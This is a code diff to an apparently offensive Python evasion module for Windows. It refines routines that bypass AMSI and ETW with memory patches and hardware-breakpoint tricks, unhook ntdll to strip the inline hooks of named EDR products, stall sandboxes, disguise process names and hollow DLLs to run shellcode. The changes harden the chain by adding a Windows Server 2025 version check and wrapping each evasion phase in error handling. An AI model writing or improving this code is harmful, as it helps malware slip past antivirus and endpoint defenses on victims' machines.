@@ -52,6 +52,15 @@ def bypass_amsi():
     return _patch_mem('amsi.dll', 'AmsiScanBuffer', patch)
 
 
+def _is_server_2025_or_later():
+    """Check if running on Windows Server 2025+ (build >= 26100) where VEH CONTEXT offsets differ"""
+    try:
+        ver = sys.getwindowsversion()
+        return ver.build >= 26100
+    except Exception:
+        return False
+
+
 def bypass_amsi_patchless():
     """Patchless AMSI bypass via VEH + hardware breakpoints (DR0-DR3)
 
@@ -62,6 +71,8 @@ def bypass_amsi_patchless():
     are modified in memory, so integrity checks pass.
     """
     if sys.platform != 'win32':
+        return False
+    if _is_server_2025_or_later():
         return False
     try:
         EXCEPTION_SINGLE_STEP = 0x80000004
@@ -168,6 +179,8 @@ def bypass_etw_patchless():
     intercepts via VEH, forces STATUS_SUCCESS return. No memory patches.
     """
     if sys.platform != 'win32':
+        return False
+    if _is_server_2025_or_later():
         return False
     try:
         etw_addr = kernel32.GetProcAddress(
@@ -423,13 +436,7 @@ def time_difference_attack(payload_func, window_ms=80):
 
 
 def unhook_ntdll():
-    """Remap a clean copy of ntdll.dll from disk to remove EDR inline hooks
-
-    Works against: CrowdStrike Falcon, Elastic EDR, SentinelOne, Sophos
-    EDRs hook ntdll functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.)
-    by inserting JMP instructions. This reads the pristine copy from disk and
-    overwrites the .text section, restoring original instructions.
-    """
+    """Remap a clean copy of ntdll.dll from disk to remove EDR inline hooks."""
     if sys.platform != 'win32':
         return False
     try:
@@ -519,12 +526,14 @@ def unhook_ntdll():
                 src = clean_ntdll + raw_offset
 
                 old_protect = ctypes.wintypes.DWORD(0)
-                VirtualProtect(
+                vp_ok = VirtualProtect(
                     ctypes.c_void_p(dest),
                     ctypes.c_size_t(virtual_size),
                     PAGE_EXECUTE_READWRITE,
                     ctypes.byref(old_protect)
                 )
+                if not vp_ok:
+                    break
                 ctypes.memmove(ctypes.c_void_p(dest), ctypes.c_void_p(src), virtual_size)
                 VirtualProtect(
                     ctypes.c_void_p(dest),
@@ -1340,10 +1349,9 @@ def delay_execution_sandbox():
     except Exception:
         pass
 
-    # If sandbox score is high, delay or exit gracefully
+    # If sandbox score is high, delay to exhaust sandbox timeout
     if score >= 40:
-        # Long sleep to exhaust sandbox timeout
-        time.sleep(score)
+        time.sleep(min(score, 15))
 
 
 def phantom_dll_hollowing(shellcode):
@@ -2779,25 +2787,43 @@ def init_evasion():
     if sys.platform != 'win32':
         return
 
-    delay_execution_sandbox()
+    try:
+        delay_execution_sandbox()
+    except Exception:
+        pass
 
     # Detect EDRs to adapt strategy
-    edrs = detect_edr_processes()
+    try:
+        edrs = detect_edr_processes()
+    except Exception:
+        edrs = ''
 
     # Phase 1: Remove hooks (must be first)
-    unhook_ntdll()
+    try:
+        unhook_ntdll()
+    except Exception:
+        pass
 
     # Phase 2: Blind telemetry — prefer patchless (VEH+HWBP) over patching
     # Patchless methods survive integrity checks (CrowdStrike, MDE)
-    if not bypass_etw_patchless():
-        bypass_etw()
+    try:
+        if not bypass_etw_patchless():
+            bypass_etw()
+    except Exception:
+        pass
 
     # Phase 3: Disable content scanning — patchless first
-    if not bypass_amsi_patchless():
-        bypass_amsi()
+    try:
+        if not bypass_amsi_patchless():
+            bypass_amsi()
+    except Exception:
+        pass
 
     # Phase 4: Process disguise
-    masquerade_process_name()
+    try:
+        masquerade_process_name()
+    except Exception:
+        pass
 
     # Phase 5: File-level evasion
     try:
